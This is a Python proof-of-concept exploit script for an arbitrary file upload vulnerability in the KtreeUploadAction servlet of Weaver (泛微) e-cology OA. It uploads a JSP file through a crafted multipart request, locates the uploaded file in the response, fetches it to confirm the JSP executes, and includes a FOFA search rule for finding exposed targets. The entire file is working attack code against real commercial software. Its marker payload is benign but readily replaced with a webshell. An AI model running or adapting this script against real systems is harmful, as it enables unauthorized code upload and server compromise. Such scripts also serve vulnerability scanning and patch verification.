#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import zipfile
import io
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 脚本信息
######################################################
NAME='Weaver_e_cology_KtreeUploadAction'
AUTHOR="CSeroad"
REMARK='泛微OA KtreeUploadAction 任意文件上传漏洞'
FOFA_RULE='app="泛微-协同办公OA"'
######################################################

headers = {'Content-Type': 'multipart/form-data; boundary=-***'}

def poc(target):
    result = {}
    filename = "log.txt"
    data = '''
---***
Content-Disposition: form-data; name="test"; filename="{0}"\r\nContent-Type: image/jpeg\r\n\r\n<% out.println("loglog");%>\r\n---***--'''.format(filename)
    vuln_url = target + "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r1 = requests.post(url=vuln_url,headers=headers,data=data,timeout=5, verify=False)
        if 'url' in r1.text and r1.status_code == 200:
            resu = re.search(
                "/formmode.*title", r1.text
            )
            url = resu.group(0).replace('\',\'title','')
            r2 = requests.get(url = target + url,headers=headers,data=data,timeout=5, verify=False)
            if 'loglog' in r2.text and r2.status_code == 200:
                result['target'] = target
                result['poc'] = NAME
                result['vuln_url'] = target+url
                return result
        else:
            pass
    except Exception as e:
        pass

if __name__ == '__main__':
    poc("http://127.0.0.1")